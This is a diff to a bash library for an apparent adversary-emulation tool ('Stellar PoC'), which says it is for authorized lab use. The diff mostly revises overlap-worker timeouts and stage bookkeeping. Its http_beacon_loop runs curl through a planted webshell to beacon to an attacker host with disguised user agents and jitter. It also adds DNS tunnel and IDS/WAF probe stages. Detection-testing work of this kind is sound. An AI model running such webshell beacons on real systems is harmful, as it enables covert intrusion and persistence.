@@ -1,7 +1,7 @@
 # ==============================================================================
 # Stellar PoC — Human-like operator telemetry extensions (sourced library)
 # Safe, authorized lab use only. No exploits, no credential theft, no destruction.
-# @stellar-poc-version: 1.0.0
+# @stellar-poc-version: 1.2.0
 # ==============================================================================
 
 # --- Humanize feature flags (defaults) ---
@@ -9,6 +9,7 @@ PERSISTENT_BEACON=false
 BEACON_INTERVAL_SEC=20
 JITTER_PERCENT=30
 PIPELINE_OVERLAP=false
+OVERLAP_EXECUTED=false
 MAX_OVERLAP=2
 TIMING_PROFILE="balanced"
 SLOW_HTTP=false
@@ -24,6 +25,7 @@ OVERLAP_GROUP_SEQ=0
 
 HUMANIZE_PIDS=()
 PIPELINE_OVERLAP_PIDS=()
+PIPELINE_OVERLAP_STAGE_LABELS=()
 PERSISTENT_BEACON_PIDS=()
 NOISE_PIDS=()
 SLOW_HTTP_PIDS=()
@@ -156,7 +158,8 @@ log_humanize_timeline() {
 count_remote_target_file() {
     local file="$1" cache n
     if [[ "${DRY_RUN}" == true ]]; then
-        echo 1
+        n=$(get_local_hosts "${file}" 2>/dev/null | extract_host_file_lines | safe_count_lines)
+        safe_int "${n}"
         return 0
     fi
     [[ -z "${file}" ]] && { echo 0; return 0; }
@@ -179,36 +182,24 @@ humanize_flag_path() {
 }
 
 http_beacon_loop() {
-    local paths=(
-        "${CALLBACK_PREFIX}/health"
-        "${CALLBACK_PREFIX}/ping"
-        "${CALLBACK_PREFIX}/status"
-        "${CALLBACK_PREFIX}/check"
-        "/favicon.ico"
-    )
-    local uas=(
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-        "curl/8.0 PoC-Operator"
-        "TelemetryAgent/2.1"
-    )
-    local path ua attacker_host attacker_port i
+    local beacon_path="${CALLBACK_PREFIX}/check-in"
+    local ua="TelemetryCollector/9.7"
+    local attacker_host attacker_port
     attacker_host="${ATTACKER_BASE_URL#http://}"
     attacker_host="${attacker_host%%:*}"
     attacker_port="${ATTACKER_BASE_URL##*:}"
     while [[ -f "$(humanize_flag_path "persistent_beacon")" ]] && ! pipeline_stop_requested && [[ "${PIPELINE_ACTIVE}" != true ]]; do
-        path="${paths[RANDOM % ${#paths[@]}]}"
-        ua="${uas[RANDOM % ${#uas[@]}]}"
         if [[ "${HAS_curl:-false}" == true ]]; then
             run_webshell "persistent-beacon-http" \
-                "curl -s --max-time 3 -A $(printf '%q' "${ua}") -H 'X-PoC-Campaign: ${CAMPAIGN_ID}' '${ATTACKER_BASE_URL}${path}?c=${CAMPAIGN_ID}&t='\$(date +%s) >/dev/null 2>&1 || true" \
+                "curl -s --max-time 3 -A $(printf '%q' "${ua}") -H 'X-PoC-Campaign: ${CAMPAIGN_ID}' -H 'X-Callback-Mode: persistent-low-slow' '${ATTACKER_BASE_URL}${beacon_path}?c=${CAMPAIGN_ID}&t='\$(date +%s) >/dev/null 2>&1 || true" \
                 >/dev/null 2>&1 || true
         else
             run_webshell "persistent-beacon-http-raw" \
-                "${REMOTE_SHELL_HELPERS} poc_http_send '${attacker_host}' '${attacker_port}' \"GET ${path} HTTP/1.1\\r\\nHost: ${attacker_host}\\r\\nUser-Agent: ${ua}\\r\\nConnection: close\\r\\n\\r\\n\" >/dev/null 2>&1 || true" \
+                "${REMOTE_SHELL_HELPERS} poc_http_send '${attacker_host}' '${attacker_port}' \"GET ${beacon_path}?c=${CAMPAIGN_ID} HTTP/1.1\\r\\nHost: ${attacker_host}\\r\\nUser-Agent: ${ua}\\r\\nConnection: close\\r\\n\\r\\n\" >/dev/null 2>&1 || true" \
                 >/dev/null 2>&1 || true
         fi
         HUMANIZE_BEACON_HTTP_COUNT=$((HUMANIZE_BEACON_HTTP_COUNT + 1))
-        log_humanize_timeline "persistent_beacon_http" "path=${path}"
+        log_humanize_timeline "persistent_beacon_http" "path=${beacon_path}"
         randomized_sleep "${BEACON_INTERVAL_SEC}" "${JITTER_PERCENT}"
     done
 }
@@ -490,35 +481,100 @@ stage_adaptive_operator_followup() {
 }
 
 reap_pipeline_overlap_pids() {
-    local -a alive=()
-    local pid
-    for pid in "${PIPELINE_OVERLAP_PIDS[@]}"; do
+    local -a alive=() alive_labels=()
+    local pid label idx
+    for idx in "${!PIPELINE_OVERLAP_PIDS[@]}"; do
+        pid="${PIPELINE_OVERLAP_PIDS[$idx]}"
+        label="${PIPELINE_OVERLAP_STAGE_LABELS[$idx]:-unknown}"
         [[ -z "${pid}" ]] && continue
         if kill -0 "${pid}" 2>/dev/null; then
             alive+=("${pid}")
+            alive_labels+=("${label}")
         else
             wait "${pid}" 2>/dev/null || true
         fi
     done
     PIPELINE_OVERLAP_PIDS=("${alive[@]}")
+    PIPELINE_OVERLAP_STAGE_LABELS=("${alive_labels[@]}")
+}
+
+overlap_slot_wait_timeout_secs() {
+    case "${POC_INTENSITY:-normal}" in
+        high|spike) printf '600' ;;
+        *) printf '300' ;;
+    esac
+}
+
+overlap_worker_wait_timeout_secs() {
+    case "${POC_INTENSITY:-normal}" in
+        high|spike) printf '900' ;;
+        *) printf '600' ;;
+    esac
+}
+
+is_summary_critical_overlap_stage() {
+    case "$1" in
+        "Mandatory HTTP URL Burst"|"HTTP/HTTPS Follow-up"|"Enhanced DNS Tunnel"|"Mandatory DNS"|"Internal Web Fanout")
+            return 0
+            ;;
+    esac
+    return 1
+}
+
+is_overlap_kill_exempt_stage() {
+    case "$1" in
+        "Mandatory HTTP URL Burst")
+            return 0
+            ;;
+    esac
+    return 1
+}
+
+mark_overlap_worker_killed() {
+    local label="$1" reason="$2"
+    log_message "WARN" "Overlap worker terminated (${reason}): ${label}"
+    set_stage_result "${label}" "Failed" "overlap worker killed (${reason})"
+    mark_overlap_stage_result_timeout "${label}" "${reason}"
+    state_append "overlap_timeline.log" "cycle=${CURRENT_CYCLE:-1} stage=${label} status=killed reason=${reason}"
 }
 
 wait_humanize_slot() {
-    local max="${MAX_OVERLAP}" running waited=0
+    local max="${MAX_OVERLAP}" running waited=0 slot_timeout critical_wait=0
+    slot_timeout=$(overlap_slot_wait_timeout_secs)
     [[ "${WEBSHELL_SLOW}" == true && "${max}" -gt 1 ]] && max=1
     while :; do
         pipeline_stop_requested && return 130
         reap_pipeline_overlap_pids
         running=${#PIPELINE_OVERLAP_PIDS[@]}
         (( running < max )) && break
-        if (( waited >= 180 )); then
-            log_message "WARN" "Overlap slot wait timeout — terminating oldest overlap worker"
-            if ((${#PIPELINE_OVERLAP_PIDS[@]} > 0)); then
-                kill -TERM "${PIPELINE_OVERLAP_PIDS[0]}" 2>/dev/null || true
-                wait "${PIPELINE_OVERLAP_PIDS[0]}" 2>/dev/null || true
-                PIPELINE_OVERLAP_PIDS=("${PIPELINE_OVERLAP_PIDS[@]:1}")
+        if (( waited >= slot_timeout )); then
+            local victim_label="${PIPELINE_OVERLAP_STAGE_LABELS[0]:-unknown}"
+            if is_overlap_kill_exempt_stage "${victim_label}" || is_summary_critical_overlap_stage "${victim_label}"; then
+                critical_wait=$((critical_wait + 1))
+                if (( critical_wait >= slot_timeout )); then
+                    if ((${#PIPELINE_OVERLAP_PIDS[@]} > 0)); then
+                        mark_overlap_worker_killed "${victim_label}" "summary-critical overlap slot timeout"
+                        kill -TERM "${PIPELINE_OVERLAP_PIDS[0]}" 2>/dev/null || true
+                        wait "${PIPELINE_OVERLAP_PIDS[0]}" 2>/dev/null || true
+                        PIPELINE_OVERLAP_PIDS=("${PIPELINE_OVERLAP_PIDS[@]:1}")
+                        PIPELINE_OVERLAP_STAGE_LABELS=("${PIPELINE_OVERLAP_STAGE_LABELS[@]:1}")
+                    fi
+                    waited=0
+                    critical_wait=0
+                else
+                    log_message "WARN" "Overlap slot wait — preserving summary-critical stage: ${victim_label} (${critical_wait}/${slot_timeout}s)"
+                fi
+            else
+                log_message "WARN" "Overlap slot wait timeout — terminating oldest overlap worker (${victim_label})"
+                if ((${#PIPELINE_OVERLAP_PIDS[@]} > 0)); then
+                    mark_overlap_worker_killed "${victim_label}" "overlap slot timeout"
+                    kill -TERM "${PIPELINE_OVERLAP_PIDS[0]}" 2>/dev/null || true
+                    wait "${PIPELINE_OVERLAP_PIDS[0]}" 2>/dev/null || true
+                    PIPELINE_OVERLAP_PIDS=("${PIPELINE_OVERLAP_PIDS[@]:1}")
+                    PIPELINE_OVERLAP_STAGE_LABELS=("${PIPELINE_OVERLAP_STAGE_LABELS[@]:1}")
+                fi
+                waited=0
             fi
-            waited=0
         fi
         interruptible_sleep 1 || return 130
         waited=$((waited + 1))
@@ -527,6 +583,8 @@ wait_humanize_slot() {
 
 run_stage_concurrent() {
     local label="$1" fn_name="$2" pid
+    OVERLAP_EXECUTED=true
+    state_append "overlap_executed.flag" "true"
     OVERLAP_GROUP_SEQ=$((OVERLAP_GROUP_SEQ + 1))
     CURRENT_OVERLAP_GROUP="${OVERLAP_GROUP_SEQ}"
     wait_humanize_slot
@@ -534,44 +592,58 @@ run_stage_concurrent() {
     (
         CURRENT_OVERLAP_GROUP="${OVERLAP_GROUP_SEQ}"
         SSH_AUTH_BURST_ENABLED=true
-        export SSH_AUTH_BURST_ENABLED LOCAL_STATE_DIR REMOTE_RUNTIME_DIR
+        export SSH_AUTH_BURST_ENABLED LOCAL_STATE_DIR REMOTE_RUNTIME_DIR CAMPAIGN_ID TARGET_NET LOG_DIR EFFECTIVE_REPORT_DIR
+        export HAS_dig HAS_nslookup HAS_host HAS_python3 HAS_curl HAS_ping HAS_bash HAS_ssh HAS_timeout
+        export REMOTE_SHELL_BIN WEBSHELL_CMD_STYLE REMOTE_SHELL_HELPERS POC_INTENSITY DRY_RUN
+        export WEB_SHELL_URL WEBSHELL_METHOD WEBSHELL_LOCK_FILE ATTACKER_IP ATTACKER_BASE_URL
+        export REMOTE_PING_PATH CAMPAIGN_ID CURRENT_CYCLE
         log_humanize_timeline "overlap_stage_start" "label=${label} group=${CURRENT_OVERLAP_GROUP}"
         run_stage_safe "${label}" "${fn_name}"
         log_humanize_timeline "overlap_stage_end" "label=${label} group=${CURRENT_OVERLAP_GROUP}"
     ) &
     pid=$!
     PIPELINE_OVERLAP_PIDS+=("${pid}")
+    PIPELINE_OVERLAP_STAGE_LABELS+=("${label}")
     state_append "overlap_timeline.log" "cycle=${CURRENT_CYCLE:-1} group=${CURRENT_OVERLAP_GROUP} stage=${label} pid=${pid}"
 }
 
 wait_all_humanize_workers() {
-    local pid start now timeout_s=180
-    for pid in "${PIPELINE_OVERLAP_PIDS[@]}"; do
+    local pid label idx start now timeout_s killed
+    timeout_s=$(overlap_worker_wait_timeout_secs)
+    for idx in "${!PIPELINE_OVERLAP_PIDS[@]}"; do
+        pid="${PIPELINE_OVERLAP_PIDS[$idx]}"
+        label="${PIPELINE_OVERLAP_STAGE_LABELS[$idx]:-unknown}"
         [[ -z "${pid}" ]] && continue
         pipeline_stop_requested && break
         if ! kill -0 "${pid}" 2>/dev/null; then
             wait "${pid}" 2>/dev/null || true
             continue
         fi
-        log_message "OK" "Waiting for overlap worker pid=${pid}..."
+        log_message "OK" "Waiting for overlap worker pid=${pid} (${label})..."
         start=$(date +%s)
+        killed=0
         while kill -0 "${pid}" 2>/dev/null; do
             pipeline_stop_requested && break
             now=$(date +%s)
             if (( now - start > timeout_s )); then
-                log_message "WARN" "Overlap worker pid=${pid} timeout (${timeout_s}s) — terminating"
+                mark_overlap_worker_killed "${label}" "worker wait timeout ${timeout_s}s"
                 kill -TERM "${pid}" 2>/dev/null || true
                 interruptible_sleep 1 || break
                 kill -KILL "${pid}" 2>/dev/null || true
+                killed=1
                 break
             fi
             interruptible_sleep 1 || break
         done
         wait "${pid}" 2>/dev/null || true
-        log_message "OK" "Overlap worker pid=${pid} finished"
+        if (( killed == 0 )); then
+            log_message "OK" "Overlap worker pid=${pid} (${label}) finished"
+        fi
     done
     PIPELINE_OVERLAP_PIDS=()
+    PIPELINE_OVERLAP_STAGE_LABELS=()
     CURRENT_OVERLAP_GROUP=0
+    load_overlap_stage_results_from_state
 }
 
 pause_pipeline_background_workers() {
@@ -605,6 +677,7 @@ stop_all_humanize_workers() {
         wait "${pid}" 2>/dev/null || true
     done
     PIPELINE_OVERLAP_PIDS=()
+    PIPELINE_OVERLAP_STAGE_LABELS=()
     wait_all_humanize_workers
     for pid in "${HUMANIZE_PIDS[@]}"; do
         [[ -z "${pid}" ]] && continue
@@ -639,6 +712,7 @@ run_followup_stages_adaptive() {
         run_stage_concurrent "Elastic Follow-up" stage_elastic_followup
         run_stage_concurrent "Mongo Follow-up" stage_mongo_followup
         run_stage_concurrent "HTTP/HTTPS Follow-up" stage_http_followup
+        run_stage_concurrent "IDS/WAF Signature Probe" stage_ids_waf_signature_probe
         wait_all_humanize_workers
         if [[ "${include_windows}" == true ]]; then
             run_pipeline_stage "Windows Telemetry" stage_windows_telemetry
@@ -650,6 +724,7 @@ run_followup_stages_adaptive() {
     run_pipeline_stage "Elastic Follow-up" stage_elastic_followup
     run_pipeline_stage "Mongo Follow-up" stage_mongo_followup
     run_pipeline_stage "HTTP/HTTPS Follow-up" stage_http_followup
+    run_pipeline_stage "IDS/WAF Signature Probe" stage_ids_waf_signature_probe
     if [[ "${include_windows}" == true ]]; then
         run_pipeline_stage "Windows Telemetry" stage_windows_telemetry
     fi
